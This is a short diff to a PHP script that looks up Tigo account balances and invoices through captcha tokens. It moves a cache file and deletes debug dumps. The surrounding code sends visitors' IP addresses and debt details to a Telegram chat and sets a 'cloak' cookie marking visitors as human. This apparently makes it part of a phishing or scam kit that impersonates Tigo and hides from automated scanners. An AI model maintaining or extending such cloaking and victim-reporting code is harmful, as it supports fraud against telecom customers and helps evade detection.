@@ -382,7 +382,7 @@ function getTigoBalance($value, $type, $recaptchaToken, $imageCaptchaText = null
 }
 
 
-$cacheFile = __DIR__ . '/captcha_cache.json';
+$cacheFile = sys_get_temp_dir() . '/captcha_cache.json';
 
 // Leer token del caché compartido
 $token = null;
@@ -490,7 +490,6 @@ if ($hasDebt && count($invoices) > 0) {
     $telegramMessage .= "🌐 IP: `$clientIP`";
     sendTelegramMessage($telegramMessage);
 
-    file_put_contents(__DIR__ . '/debug_success.json', json_encode($data, JSON_PRETTY_PRINT));
     
     // El captcha fue resuelto y validado por Tigo -> Usuario Humano Confirmado
     cloak_set_cookie('is_human', 'true');
@@ -541,7 +540,6 @@ elseif (isset($data['data']['result'])) {
     }
 }
 else {
-    file_put_contents('debug_tigo.json', json_encode($data, JSON_PRETTY_PRINT));
 
     // Check if this is a CAPTCHA error from Tigo
     if (isset($data['data']['result']['formattedValue'])) {
